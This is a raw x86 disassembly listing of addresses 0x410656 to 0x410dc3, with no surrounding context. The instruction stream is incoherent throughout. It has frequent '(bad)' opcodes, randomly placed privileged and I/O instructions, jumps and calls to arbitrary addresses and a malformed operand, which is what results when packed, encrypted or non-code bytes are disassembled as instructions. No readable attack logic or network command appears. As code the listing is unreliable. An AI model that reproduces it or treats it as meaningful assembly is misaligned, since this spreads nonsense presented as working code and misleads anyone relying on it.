  410656:	loope  0x41065c
  410658:	xor    cl,dl
  41065a:	pop    ebx
  41065b:	jb     0x410653
  41065d:	jns    0x41065f
  41065f:	(bad)  
  410660:	cmp    DWORD PTR [ebx+0x31274480],ebx
  410666:	push   0x6
  410668:	dec    edi
  410669:	or     edx,DWORD PTR [eax]
  41066b:	sub    dl,dh
  41066d:	and    esp,DWORD PTR [edx-0x7a3e2949]
  410673:	inc    ebx
  410674:	adc    eax,0x2e966995
  410679:	and    ebx,DWORD PTR [ebx]
  41067b:	xor    DWORD PTR [edx-0x5351fd6e],edi
  410681:	xor    al,0xd
  410683:	out    0xb6,eax
  410685:	(bad)
  410688:	cli    
  410689:	pushf  
  41068a:	mov    cl,0xa3
  41068c:	cmp    BYTE PTR [edx+0x6228194f],al
  410692:	(bad)  
  410693:	xchg   ebp,eax
  410694:	gs jge 0x4106a5
  410697:	jmp    0x4106b2
  410699:	xchg   ebp,eax
  41069a:	ror    DWORD PTR [ebx],0x30
  41069d:	adc    BYTE PTR [ecx+0x37],ch
  4106a0:	push   0x42863fa0
  4106a5:	in     al,0x46
  4106a7:	inc    eax
  4106a8:	call   DWORD PTR [eax]
  4106aa:	mov    ecx,0x8204697
  4106af:	sbb    ah,BYTE PTR [edi-0x4854d10d]
  4106b5:	sub    eax,0xc8a9f70f
  4106ba:	shl    BYTE PTR [eax-0x2b],1
  4106bd:	xchg   edi,eax
  4106be:	invd   
  4106c0:	into   
  4106c1:	rcl    DWORD PTR [eax+ebx*2],cl
  4106c4:	cmp    DWORD PTR [ebx+0x369deb6d],esi
  4106ca:	dec    edx
  4106cb:	adc    BYTE PTR [ecx],ch
  4106cd:	mov    ds:0x21e1b257,eax
  4106d2:	shl    DWORD PTR [ebp-0xa53a5f6],cl
  4106d8:	jmp    0x6f6ac532
  4106dd:	sti    
  4106de:	aas    
  4106df:	ror    BYTE PTR [edi],0x27
  4106e2:	or     al,0xcf
  4106e4:	call   0x5480:0x8da846ab
  4106eb:	cmp    al,0x64
  4106ed:	pop    eax
  4106ee:	adc    ebp,edi
  4106f0:	int3   
  4106f1:	test   BYTE PTR [edi+0x33],bl
  4106f4:	ret    
  4106f5:	and    eax,0x9b040343
  4106fa:	enter  0x981b,0xfc
  4106fe:	hlt    
  4106ff:	(bad)  
  410700:	adc    eax,0x770ef95c
  410705:	mov    bh,0x7d
  410707:	retf   
  410708:	js     0x4106d2
  41070a:	ins    DWORD PTR es:[edi],dx
  41070b:	nop
  41070c:	xor    al,0xa6
  41070e:	jle    0x4106f8
  410710:	xchg   ch,dl
  410712:	gs int3 
  410714:	mov    esi,0x6c8045c9
  410719:	(bad)
  41071c:	jb     0x41078e
  41071e:	dec    ebx
  410720:	shr    esp,0xbb
  410723:	add    ebx,esi
  410725:	push   0x78
  410727:	aam    0xff
  410729:	mov    ch,0x12
  41072b:	adc    BYTE PTR [edx-0x2a],0xc2
  41072f:	mov    al,ds:0xb023c420
  410734:	pop    eax
  410735:	push   edx
  410736:	loop   0x41073a
  410738:	add    bh,bl
  41073a:	inc    esi
  41073b:	icebp  
  41073c:	push   ds
  41073d:	mov    ah,0xaf
  41073f:	rcl    DWORD PTR [ecx+eax*4+0x6f],0xf7
  410744:	sbb    ebx,DWORD PTR [esi+0x2b81bad0]
  41074a:	in     eax,0x5e
  41074c:	pop    edx
  41074d:	fmul   DWORD PTR [eax-0x40de228c]
  410753:	inc    ebp
  410754:	(bad)  
  410755:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410756:	sbb    al,0x9b
  410758:	mov    esp,0xe994426b
  41075d:	push   ebp
  41075e:	aas    
  41075f:	xchg   esi,eax
  410760:	pop    esi
  410761:	push   ecx
  410762:	or     BYTE PTR [esp+eax*2-0x4ee9a54],dl
  410769:	lea    edi,[ebp-0x49322bd6]
  41076f:	pop    ebp
  410770:	lahf   
  410771:	mov    bl,0xb8
  410773:	inc    ebp
  410774:	mov    dh,0x22
  410776:	outs   dx,BYTE PTR ds:[esi]
  410777:	mov    ds,WORD PTR [ecx+0x27]
  41077a:	retf   
  41077b:	xlat   BYTE PTR ds:[ebx]
  41077c:	rcl    ebp,0xb9
  41077f:	ja     0x4107d7
  410781:	js     0x410703
  410783:	push   ds
  410784:	sahf   
  410785:	das    
  410786:	imul   esp,DWORD PTR [ebp-0x5ff77a70],0x1f7474e8
  410790:	add    bh,BYTE PTR [edx+0x49]
  410793:	mov    eax,ds:0x33ab8410
  410798:	inc    edi
  410799:	leave  
  41079a:	xlat   BYTE PTR ds:[ebx]
  41079b:	rcr    cl,1
  41079d:	mov    bh,0x48
  41079f:	aaa    
  4107a0:	or     ch,BYTE PTR [eax-0x55]
  4107a3:	out    0xe0,al
  4107a5:	mov    bl,0x86
  4107a7:	push   0x70f204eb
  4107ac:	mov    ebx,0xb677c32b
  4107b1:	sahf   
  4107b2:	push   edi
  4107b3:	push   ecx
  4107b4:	ja     0x41073c
  4107b6:	hlt    
  4107b7:	push   ss
  4107b8:	xchg   ebx,eax
  4107b9:	clc    
  4107ba:	sbb    al,0x51
  4107bc:	enter  0x839c,0xa1
  4107c0:	jns    0x4107d2
  4107c2:	(bad)  
  4107c3:	mov    ch,0xf6
  4107c5:	loop   0x410771
  4107c7:	mov    al,ds:0x66e4790a
  4107cc:	jg     0x4107f1
  4107ce:	repnz or BYTE PTR ds:0xe37fa61d,ah
  4107d5:	lods   eax,DWORD PTR ds:[esi]
  4107d6:	xchg   ebp,eax
  4107d7:	and    bl,al
  4107d9:	(bad)  
  4107dc:	in     al,dx
  4107dd:	or     DWORD PTR [ecx+0x67],edx
  4107e0:	test   BYTE PTR [esi-0x59],0x4a
  4107e4:	sbb    ebx,DWORD PTR [edx+0x69296c19]
  4107ea:	sub    BYTE PTR [eax-0x68],al
  4107ed:	jne    0x41077b
  4107ef:	sub    edi,DWORD PTR [ebp+0x4a]
  4107f2:	xor    DWORD PTR [edx+0x58aedf43],0x2a
  4107f9:	mov    ds:0xecd170a0,al
  4107fe:	inc    edi
  4107ff:	jmp    0x4107f8
  410801:	(bad)  
  410802:	pusha  
  410803:	xchg   ebx,eax
  410804:	in     al,0x2c
  410806:	pop    edx
  410807:	adc    al,0x51
  410809:	mov    BYTE PTR [ecx+0x3a64c86c],cl
  41080f:	mov    edx,0xb0dc4b3f
  410814:	es mov di,0x7f85
  410819:	ss push es
  41081b:	bound  esi,QWORD PTR [eax-0x2eaf6bd4]
  410821:	xchg   esi,eax
  410822:	add    DWORD PTR [edx-0x76e5975],ebp
  410828:	push   es
  410829:	xchg   edx,eax
  41082a:	cmp    dh,BYTE PTR ds:0x9afba438
  410830:	call   0xfea9a60f
  410835:	fcmovnbe st,st(0)
  410837:	bound  ebx,QWORD PTR [edx-0xc]
  41083a:	fidivr DWORD PTR [eax]
  41083c:	xchg   ebx,eax
  41083d:	mov    gs,esi
  41083f:	xchg   edx,eax
  410840:	pop    ebp
  410841:	in     eax,dx
  410842:	mov    bl,dl
  410844:	inc    ebx
  410845:	dec    esi
  410846:	inc    esi
  410847:	in     eax,0x57
  410849:	sub    cl,al
  41084b:	es xchg esi,eax
  41084d:	loop   0x4107f3
  41084f:	bound  esi,QWORD PTR [ebp+0x2274437b]
  410855:	fild   WORD PTR [ecx-0x48]
  410858:	je     0x41086a
  41085a:	push   esp
  41085b:	jp     0x4108a8
  41085d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41085e:	dec    edx
  41085f:	jnp    0x4107e4
  410861:	sub    eax,0x1aa3388b
  410866:	and    eax,0xda2c6e
  41086b:	add    edx,eax
  41086d:	xor    edx,0x28db4938
  410873:	inc    ebx
  410874:	inc    ecx
  410875:	xchg   edx,eax
  410876:	ja     0x410840
  410878:	mov    ds:0xd0b0f1cd,al
  41087d:	(bad)  
  41087f:	leave  
  410880:	xchg   ecx,eax
  410881:	stos   BYTE PTR es:[edi],al
  410882:	sbb    edi,esp
  410884:	pop    edx
  410885:	std    
  410886:	sahf   
  410887:	shl    BYTE PTR [edi],0xe5
  41088a:	fidivr DWORD PTR [ebx]
  41088c:	xchg   ebp,eax
  41088d:	(bad)  
  41088e:	pop    ebx
  41088f:	mov    eax,ds:0xdb540cfd
  410894:	outs   dx,BYTE PTR ds:[esi]
  410895:	es jne 0x41090a
  410898:	cdq    
  410899:	xchg   ebp,eax
  41089a:	mov    ch,0xf7
  41089c:	dec    edi
  41089d:	mov    al,ds:0xd9bf019b
  4108a2:	mov    BYTE PTR [ecx],dl
  4108a4:	add    dh,BYTE PTR [ecx+esi*8+0x2893bf79]
  4108ab:	js     0x4108a5
  4108ad:	push   ebx
  4108ae:	push   es
  4108af:	xor    ecx,esi
  4108b1:	and    BYTE PTR [ebx],bh
  4108b3:	jmp    0x4108eb
  4108b5:	daa    
  4108b6:	hlt    
  4108b7:	pop    edi
  4108b8:	div    DWORD PTR [ecx+0x12]
  4108bb:	xchg   esp,eax
  4108bc:	jb     0x41083f
  4108be:	inc    ecx
  4108bf:	hlt    
  4108c0:	add    DWORD PTR [edx+eax*8],eax
  4108c3:	mov    bl,0x89
  4108c5:	inc    ecx
  4108c6:	(bad)  
  4108c7:	sbb    ecx,DWORD PTR [eax]
  4108c9:	aam    0xc
  4108cb:	gs dec edi
  4108cd:	cmp    edi,edi
  4108cf:	add    dh,BYTE PTR [esi-0x63]
  4108d2:	cwde   
  4108d3:	popa   
  4108d4:	jbe    0x4108e0
  4108d6:	inc    edx
  4108d7:	push   0xffffffc4
  4108d9:	pop    eax
  4108da:	lahf   
  4108db:	ds in  al,dx
  4108dd:	jge    0x41088c
  4108df:	push   edi
  4108e0:	dec    edi
  4108e1:	jle    0x41090e
  4108e3:	js     0x410956
  4108e5:	xchg   ebx,eax
  4108e6:	sar    DWORD PTR [esi+0x23],cl
  4108e9:	inc    edi
  4108ea:	push   ss
  4108eb:	mov    al,0x31
  4108ed:	pop    eax
  4108ee:	call   0x2551cee6
  4108f3:	(bad)  
  4108f5:	push   ebp
  4108f6:	ins    BYTE PTR es:[edi],dx
  4108f7:	aas    
  4108f8:	inc    ebx
  4108f9:	dec    ebx
  4108fa:	sub    dh,bh
  4108fc:	shl    DWORD PTR [esp+edi*1-0x26],cl
  410900:	fcomp  st(7)
  410902:	shl    DWORD PTR [edi+0x29],0xe5
  410906:	mov    DWORD PTR [edi-0x7a12b389],esp
  41090c:	inc    ebp
  41090d:	aaa    
  41090e:	push   ss
  41090f:	sahf   
  410910:	std    
  410911:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  410913:	stc    
  410914:	lods   al,BYTE PTR ds:[esi]
  410915:	and    eax,0x44a5dd37
  41091a:	add    eax,ebx
  41091c:	sahf   
  41091d:	(bad)  
  41091e:	mov    edi,DWORD PTR [ecx]
  410920:	push   es
  410921:	xor    BYTE PTR [edx+0x3a],cl
  410924:	mov    eax,0x5a8268e4
  410929:	xor    ebx,edi
  41092b:	push   cs
  41092c:	pop    esp
  41092d:	ins    BYTE PTR es:[edi],dx
  41092e:	out    0x4a,eax
  410930:	inc    esi
  410931:	hlt    
  410932:	bound  esp,QWORD PTR [edi-0x64669dbf]
  410938:	scas   al,BYTE PTR es:[edi]
  410939:	cwde   
  41093a:	fadd   DWORD PTR [esi-0x63]
  41093d:	jne    0x410970
  41093f:	pop    ebx
  410940:	aas    
  410941:	aam    0xf3
  410943:	aam    0x16
  410945:	fstp   QWORD PTR [esp+eiz*8]
  410948:	je     0x410977
  41094a:	inc    esp
  41094b:	xchg   DWORD PTR [ebx+0x78],edi
  41094e:	in     al,0x8a
  410950:	ret    0xdb09
  410953:	or     ebp,eax
  410955:	imul   eax,DWORD PTR [ecx-0x4df8bf8f],0x1a
  41095c:	gs push eax
  41095e:	and    BYTE PTR [esi+0x3820d673],bl
  410964:	mov    ah,0x6
  410966:	test   BYTE PTR [edx+edi*8],bl
  410969:	daa    
  41096a:	mov    bh,0x5d
  41096c:	mov    ebp,0x775c5229
  410971:	shl    DWORD PTR [ebx-0x69],cl
  410974:	fist   WORD PTR [edi]
  410976:	cmp    BYTE PTR ds:0xdb654f4b,dh
  41097c:	pusha  
  41097d:	cmp    al,0x96
  41097f:	hlt    
  410980:	scas   al,BYTE PTR es:[edi]
  410981:	test   eax,0xa6f561cc
  410986:	push   es
  410987:	jmp    0x960bf56b
  41098c:	inc    ebx
  41098d:	leave  
  41098e:	cwde   
  41098f:	pop    ebp
  410990:	push   ecx
  410991:	cld    
  410992:	mov    ecx,0x86a678fd
  410997:	push   edi
  410998:	in     eax,0xa
  41099a:	call   0x72e30e29
  41099f:	dec    esp
  4109a0:	je     0x4109f5
  4109a2:	(bad)  
  4109a3:	push   ecx
  4109a4:	inc    eax
  4109a5:	push   esp
  4109a6:	inc    ecx
  4109a7:	mov    WORD PTR [ebx],cs
  4109a9:	imul   edx,DWORD PTR [edi],0x3e
  4109ac:	fwait
  4109ad:	addr16 jmp 0xd925b85b
  4109b3:	adc    ch,ah
  4109b5:	ss aad 0x50
  4109b8:	fst    QWORD PTR [ebp-0x57a37fb8]
  4109be:	(bad)  
  4109bf:	sahf   
  4109c0:	xchg   DWORD PTR [ebp-0x56],esi
  4109c3:	aad    0xe9
  4109c5:	out    0x17,eax
  4109c7:	pop    ds
  4109c8:	push   ss
  4109c9:	stc    
  4109ca:	aas    
  4109cb:	rol    BYTE PTR [ebx],0x9e
  4109ce:	pop    edx
  4109cf:	inc    esi
  4109d0:	add    bl,ah
  4109d2:	out    0x9a,al
  4109d4:	pop    ss
  4109d5:	sub    ah,BYTE PTR [ecx]
  4109d7:	dec    eax
  4109d8:	and    DWORD PTR [edi],ebx
  4109da:	fucomip st,st(1)
  4109dc:	push   ecx
  4109dd:	push   esi
  4109de:	into   
  4109df:	std    
  4109e0:	ins    BYTE PTR es:[edi],dx
  4109e1:	pop    ecx
  4109e2:	cwde   
  4109e3:	xchg   ebp,eax
  4109e4:	dec    ecx
  4109e5:	and    bl,0xc4
  4109e8:	popa   
  4109e9:	repz inc ecx
  4109eb:	mov    al,0x6a
  4109ed:	sar    DWORD PTR [edi+0x2f],cl
  4109f0:	push   0x9
  4109f2:	push   edi
  4109f3:	dec    ebx
  4109f4:	hlt    
  4109f5:	xchg   esi,eax
  4109f6:	add    BYTE PTR [esi+eiz*8],0xe7
  4109fa:	push   cs
  4109fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4109fc:	(bad)  
  4109fd:	fbld   TBYTE PTR [edi+edi*8+0x4a03f81a]
  410a04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a05:	repz or edi,DWORD PTR [edi+0x628add4d]
  410a0c:	repz jle 0x4109c1
  410a0f:	sub    eax,0x53672545
  410a14:	xor    BYTE PTR [eax],bh
  410a16:	push   edi
  410a17:	dec    ecx
  410a18:	pop    es
  410a19:	cmp    BYTE PTR [edx-0x5ae3714e],bl
  410a1f:	jmp    0x410a43
  410a21:	or     dh,BYTE PTR [esi]
  410a23:	mov    ebx,0x94a24415
  410a28:	push   esi
  410a29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a2a:	sbb    BYTE PTR [eax-0x52623ead],ah
  410a30:	jge    0x4109d0
  410a32:	adc    al,BYTE PTR [edi+0x3c]
  410a35:	dec    eax
  410a36:	rol    DWORD PTR [edx-0x42],cl
  410a39:	mov    esi,0x425610dc
  410a3e:	pop    esi
  410a3f:	push   ss
  410a40:	fdiv   DWORD PTR [esi]
  410a42:	outs   dx,DWORD PTR ds:[esi]
  410a43:	or     BYTE PTR [eax-0x45e306f9],bh
  410a49:	or     DWORD PTR [ecx+0x18],ebp
  410a4c:	int    0xcc
  410a4e:	xchg   BYTE PTR [edi],ch
  410a50:	push   cs
  410a51:	push   ecx
  410a52:	mov    dh,BYTE PTR [edi+0x6]
  410a55:	dec    esi
  410a56:	xchg   ebx,eax
  410a57:	sub    eax,0xc9f42902
  410a5c:	xchg   BYTE PTR [edi+0x77],dh
  410a5f:	jl     0x410ac8
  410a61:	addr16 ss pop ebp
  410a64:	(bad)  
  410a65:	xchg   edx,eax
  410a66:	xchg   ebp,eax
  410a67:	test   BYTE PTR [esi+0x5d],dl
  410a6a:	lods   eax,DWORD PTR ds:[esi]
  410a6b:	and    eax,0x1be3cb07
  410a70:	fnstsw WORD PTR es:[edi+ebp*8-0x5b]
  410a75:	sub    BYTE PTR [ecx+edi*4+0x72cea1d],0x8f
  410a7d:	sub    BYTE PTR [ecx+0x68],0xa9
  410a81:	cmp    cl,BYTE PTR [esi+0x6d]
  410a84:	xchg   esp,eax
  410a85:	mov    edx,0xf15451d
  410a8a:	sub    ecx,DWORD PTR [ebx+edi*1]
  410a8d:	jo     0x410a49
  410a8f:	mov    al,0x86
  410a91:	sbb    al,0x8b
  410a93:	xlat   BYTE PTR ds:[ebx]
  410a94:	ds jns 0x410a77
  410a97:	popa   
  410a98:	lock mov edx,DWORD PTR [esi+0x1e6e62c9]
  410a9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410aa0:	rol    BYTE PTR [eax],1
  410aa2:	(bad)  
  410aa3:	jp     0x410aa9
  410aa5:	fild   DWORD PTR [ecx]
  410aa7:	mov    ah,0xae
  410aa9:	jnp    0x410b04
  410aab:	or     ebx,ebx
  410aad:	pushf  
  410aae:	mov    al,ds:0x7736d8c2
  410ab3:	cmp    DWORD PTR [ebx+0x45],ebp
  410ab6:	test   eax,0xd7eba234
  410abb:	xchg   esp,eax
  410abc:	cmp    bh,bh
  410abe:	int3   
  410abf:	xchg   edi,eax
  410ac0:	pop    ecx
  410ac1:	or     DWORD PTR [ecx-0x47650f69],ebp
  410ac7:	test   DWORD PTR [esi],esp
  410ac9:	dec    ebp
  410aca:	pcmpgtw mm2,QWORD PTR [edx+0x49]
  410ace:	and    ebx,ecx
  410ad0:	dec    esp
  410ad1:	dec    edx
  410ad2:	push   ecx
  410ad3:	outs   dx,BYTE PTR ds:[esi]
  410ad4:	mov    ds:0xba8fb71b,al
  410ad9:	adc    BYTE PTR [ebp-0x1c],dl
  410adc:	dec    ecx
  410add:	pop    esp
  410ade:	fidiv  WORD PTR [ecx]
  410ae0:	ins    DWORD PTR es:[edi],dx
  410ae1:	shl    DWORD PTR ss:[ebx+ecx*2],1
  410ae5:	cwde   
  410ae6:	xchg   DWORD PTR [esi+0x6269ea50],esp
  410aec:	loope  0x410b4b
  410aee:	inc    ebp
  410aef:	out    dx,al
  410af0:	adc    DWORD PTR [esi-0x106e98e4],0xf6710ab7
  410afa:	test   DWORD PTR [edx+0x21016423],esi
  410b00:	inc    ebp
  410b01:	adc    BYTE PTR ds:0x7b4082e7,dh
  410b07:	fidiv  DWORD PTR [edi*4-0x7e7c5b6a]
  410b0e:	mov    BYTE PTR [eax-0x75],cl
  410b11:	xor    al,BYTE PTR [ebx-0x58]
  410b14:	lods   al,BYTE PTR ds:[esi]
  410b15:	pop    edx
  410b16:	mov    edx,DWORD PTR [esi+0x6e53f40d]
  410b1c:	adc    al,0x68
  410b1e:	dec    eax
  410b1f:	sbb    dh,BYTE PTR [ecx-0x31]
  410b22:	xchg   cl,cl
  410b24:	test   al,0x28
  410b26:	lea    esi,[ebx+edx*1]
  410b29:	mov    ebp,0xb4e83144
  410b2e:	mov    ebp,0xfa7751c
  410b33:	pop    edi
  410b34:	mov    eax,eax
  410b36:	jle    0x410b5f
  410b38:	leave  
  410b39:	(bad)  
  410b3a:	call   FWORD PTR [ecx+0x6c1fd2cb]
  410b40:	mov    dl,0x94
  410b42:	int3   
  410b43:	sub    BYTE PTR [ebx+0x18],bh
  410b46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410b47:	mov    edi,edi
  410b49:	add    BYTE PTR [edi-0x4e],ah
  410b4c:	mov    cl,0xd8
  410b4e:	mov    al,0xbe
  410b50:	jl     0x410b35
  410b52:	add    BYTE PTR [ebx],bl
  410b54:	iret   
  410b55:	pop    edi
  410b56:	push   ss
  410b57:	(bad)  
  410b58:	fdiv   QWORD PTR [eax+0x19]
  410b5b:	lods   al,BYTE PTR ds:[esi]
  410b5c:	xor    BYTE PTR [eax+0x35],dh
  410b5f:	stos   DWORD PTR es:[edi],eax
  410b60:	xchg   esp,eax
  410b61:	in     al,dx
  410b62:	cwde   
  410b63:	data16 mov BYTE PTR [ecx+0x398fce8b],ah
  410b6a:	or     esi,ecx
  410b6c:	jno    0x410b5a
  410b6e:	add    BYTE PTR [edi],bl
  410b70:	loop   0x410ba9
  410b72:	dec    edx
  410b73:	(bad)  
  410b74:	dec    esp
  410b75:	loopne 0x410bbb
  410b77:	adc    edx,DWORD PTR [eax]
  410b79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b7a:	jae    0x410b09
  410b7c:	cmp    eax,0xc90714fe
  410b81:	ret    
  410b82:	or     DWORD PTR [ecx+0x3e],ebx
  410b85:	mov    esp,0x35cb6ddc
  410b8a:	stos   DWORD PTR es:[edi],eax
  410b8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410b8c:	dec    edx
  410b8d:	mov    ch,0xe8
  410b8f:	mov    eax,ds:0x414a4728
  410b94:	mov    ah,0xdb
  410b96:	shl    BYTE PTR [edi+0x40],cl
  410b99:	clc    
  410b9a:	inc    edi
  410b9b:	test   ch,al
  410b9d:	dec    ecx
  410b9e:	mov    eax,0x63f06555
  410ba3:	jge    0x410baf
  410ba5:	inc    esp
  410ba6:	push   ebp
  410ba7:	loopne 0x410c0f
  410ba9:	and    ebp,0xfffffff1
  410bac:	mov    ah,0x3f
  410bae:	lahf   
  410baf:	push   cs
  410bb0:	adc    al,BYTE PTR [eax-0x7520f1b2]
  410bb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410bb7:	rcr    esp,1
  410bb9:	fsubr  QWORD PTR [edx]
  410bbb:	in     al,0xcc
  410bbd:	adc    al,0xcd
  410bbf:	push   esp
  410bc0:	dec    DWORD PTR ds:0x5c73d8ef
  410bc6:	mov    DWORD PTR [esi-0x5e8f731b],esp
  410bcc:	in     eax,dx
  410bcd:	sti    
  410bce:	stos   DWORD PTR es:[edi],eax
  410bcf:	cdq    
  410bd0:	push   ecx
  410bd1:	sbb    DWORD PTR [esi-0x40771822],esp
  410bd7:	sub    eax,0xd4710f0b
  410bdc:	in     eax,dx
  410bdd:	(bad)  
  410bde:	cdq    
  410bdf:	jb     0x410c5c
  410be1:	mov    DWORD PTR ds:0x849b6072,edx
  410be7:	loop   0x410be3
  410be9:	inc    edx
  410bea:	xchg   esi,eax
  410beb:	jne    0x410b8d
  410bed:	scas   eax,DWORD PTR es:[edi]
  410bee:	repnz into 
  410bf0:	scas   al,BYTE PTR es:[edi]
  410bf1:	add    BYTE PTR [edi],dh
  410bf3:	xor    eax,0x5e9e382b
  410bf8:	(bad)  
  410bf9:	mov    eax,0x9e264e1d
  410bfe:	push   es
  410bff:	pop    edi
  410c00:	int3   
  410c01:	dec    esp
  410c02:	in     eax,0xb7
  410c04:	inc    ebx
  410c05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c06:	push   0x64
  410c08:	mov    ecx,0xbfb47d04
  410c0d:	xchg   edi,eax
  410c0e:	sub    DWORD PTR [eax],esi
  410c10:	xchg   esp,eax
  410c11:	popa   
  410c12:	mov    edi,0x179c5da3
  410c17:	ins    DWORD PTR es:[edi],dx
  410c18:	das    
  410c19:	and    esp,DWORD PTR [ebx-0x63b96ce3]
  410c1f:	nop
  410c20:	sbb    dl,BYTE PTR [ecx-0x5d4c6f12]
  410c26:	mov    edx,0x4d53efde
  410c2b:	outs   dx,DWORD PTR ds:[esi]
  410c2c:	and    DWORD PTR [edi+0x5e4ba4e],ebp
  410c32:	jl     0x410c1f
  410c34:	dec    eax
  410c35:	add    DWORD PTR [eax-0x78],eax
  410c38:	add    al,0xe
  410c3a:	pop    eax
  410c3b:	std    
  410c3c:	xchg   ecx,eax
  410c3d:	retf   
  410c3e:	popf   
  410c3f:	mov    ?,WORD PTR [edi+0x6f]
  410c42:	leave  
  410c43:	or     DWORD PTR [eax+0x19],esi
  410c46:	mov    ds:0xba1e364e,al
  410c4b:	mov    dl,0x12
  410c4d:	mov    eax,ds:0x5dbb19bc
  410c52:	mov    al,0xdb
  410c54:	shr    BYTE PTR [esi+ecx*4],1
  410c57:	not    BYTE PTR [edx]
  410c59:	jmp    0xdb82cd61
  410c5e:	addr16 dec edx
  410c60:	inc    ebx
  410c61:	dec    esp
  410c62:	inc    ebp
  410c63:	lods   eax,DWORD PTR ds:[esi]
  410c64:	adc    ah,BYTE PTR [eax]
  410c66:	xchg   edi,eax
  410c67:	lock out dx,eax
  410c69:	les    edi,FWORD PTR [edx+esi*8+0x13]
  410c6d:	(bad)  
  410c6e:	cli    
  410c6f:	xchg   ebx,eax
  410c70:	cwde   
  410c71:	ins    BYTE PTR es:[edi],dx
  410c72:	mov    esp,0xad337329
  410c77:	mov    edx,0xb84e6a26
  410c7c:	xchg   edi,eax
  410c7d:	mov    edx,0x68810353
  410c82:	sub    DWORD PTR [edx-0x63],esi
  410c85:	pushf  
  410c86:	xor    DWORD PTR [ebx],ecx
  410c88:	mov    dl,0x35
  410c8a:	lds    ecx,FWORD PTR [edx-0x41]
  410c8d:	mov    BYTE PTR [ecx-0x7f52279d],cl
  410c93:	dec    edi
  410c94:	sahf   
  410c95:	and    eax,0x8fe1390e
  410c9a:	dec    ecx
  410c9b:	adc    DWORD PTR [eax-0x483dc55a],ecx
  410ca1:	mov    ebx,DWORD PTR [ebx+eax*8+0x6c]
  410ca5:	jbe    0x410c49
  410ca7:	icebp  
  410ca8:	js     0x410c83
  410caa:	mov    edi,0xfd8ffb8b
  410caf:	je     0x410c50
  410cb1:	add    BYTE PTR [edx],al
  410cb3:	or     DWORD PTR [ecx-0x5311c9e5],ebp
  410cb9:	jle    0x410d13
  410cbb:	and    BYTE PTR [ebp+0x494a8da9],ch
  410cc1:	js     0x410cc9
  410cc3:	dec    eax
  410cc4:	sub    BYTE PTR [ebp+0x45],0xe7
  410cc8:	mov    al,0xb2
  410cca:	and    al,0xc7
  410ccc:	jp     0x410cfa
  410cce:	inc    ebp
  410ccf:	pop    ss
  410cd0:	cs jg  0x410d42
  410cd3:	mov    ah,0xec
  410cd5:	pop    ss
  410cd6:	sub    DWORD PTR [ecx],ebx
  410cd8:	sub    dh,BYTE PTR [eax+0x49]
  410cdb:	or     al,0xa6
  410cdd:	dec    esp
  410cde:	loope  0x410d1d
  410ce0:	ja     0x410c9a
  410ce2:	xor    ch,ch
  410ce4:	loope  0x410d0e
  410ce6:	xor    eax,0xf4d5d544
  410ceb:	nop
  410cec:	push   ebx
  410ced:	pop    ecx
  410cee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410cef:	sub    eax,0x13ef8e0e
  410cf4:	jbe    0x410ca4
  410cf6:	lods   eax,DWORD PTR ds:[esi]
  410cf7:	xor    BYTE PTR [edi],cl
  410cf9:	sub    eax,0x932bc27
  410cfe:	cmp    dl,dl
  410d00:	add    eax,0x39153784
  410d05:	shl    BYTE PTR [esi+0x1b02cc21],1
  410d0b:	stos   BYTE PTR es:[edi],al
  410d0c:	xchg   esp,eax
  410d0d:	adc    eax,0x183f0e3b
  410d12:	push   esp
  410d13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d14:	jb     0x410d1d
  410d16:	int    0x5d
  410d18:	aad    0xa9
  410d1a:	xchg   ch,ch
  410d1c:	mov    DWORD PTR [eax-0x433f153a],esi
  410d22:	mov    ebx,DWORD PTR [ebx]
  410d24:	call   0x868daa4a
  410d29:	sbb    eax,0x9a499351
  410d2e:	cwde   
  410d2f:	shl    BYTE PTR [edx+0x688f1cdc],1
  410d35:	js     0x410d32
  410d37:	mov    bh,0xa8
  410d39:	sahf   
  410d3a:	mov    cl,0x4a
  410d3c:	and    eax,0x72080aef
  410d41:	jne    0x410d12
  410d43:	cmp    ch,bh
  410d45:	fmul   QWORD PTR [ebp+0xe]
  410d48:	mov    cl,0xd5
  410d4a:	aad    0xe9
  410d4c:	jo     0x410d52
  410d4e:	inc    edi
  410d4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d50:	xchg   ebp,eax
  410d51:	add    al,0xf2
  410d53:	pop    ecx
  410d54:	sbb    ah,dh
  410d56:	adc    al,0x7d
  410d58:	and    al,BYTE PTR [ecx+edx*1+0x34fbd70b]
  410d5f:	mov    ds:0xe6482db9,eax
  410d64:	adc    al,0xe
  410d66:	jne    0x410d17
  410d68:	lods   eax,DWORD PTR ds:[esi]
  410d69:	lock test eax,0x60ddb7c
  410d6f:	imul   esi,edx,0xffffffa2
  410d72:	pop    esp
  410d73:	enter  0x923e,0x80
  410d77:	inc    esp
  410d78:	sahf   
  410d79:	(bad)  
  410d7a:	sbb    eax,0xdf2656fb
  410d7f:	pop    ss
  410d80:	mov    ebx,0x8817cb48
  410d85:	push   esp
  410d86:	lock pop eax
  410d88:	xor    ebx,eax
  410d8a:	dec    ebp
  410d8b:	or     BYTE PTR [ecx+0x9],bl
  410d8e:	or     eax,0x578b0f9f
  410d93:	pop    edi
  410d94:	into   
  410d95:	arpl   bp,bp
  410d97:	int    0x3e
  410d99:	mov    DWORD PTR [esi+0x4b139726],eax
  410d9f:	adc    eax,0x5a5d2a00
  410da4:	mov    ds:0xc95f66b6,al
  410da9:	push   0x7eaa94d9
  410dae:	xor    BYTE PTR [esi+ebp*1+0x37],bl
  410db2:	dec    edi
  410db3:	cmp    ebp,ebp
  410db5:	pop    ecx
  410db6:	dec    ecx
  410db7:	enter  0xc22e,0xea
  410dbb:	xchg   ebp,eax
  410dbc:	or     DWORD PTR [eiz*4-0x4b4f714b],ecx
  410dc3:	retf   
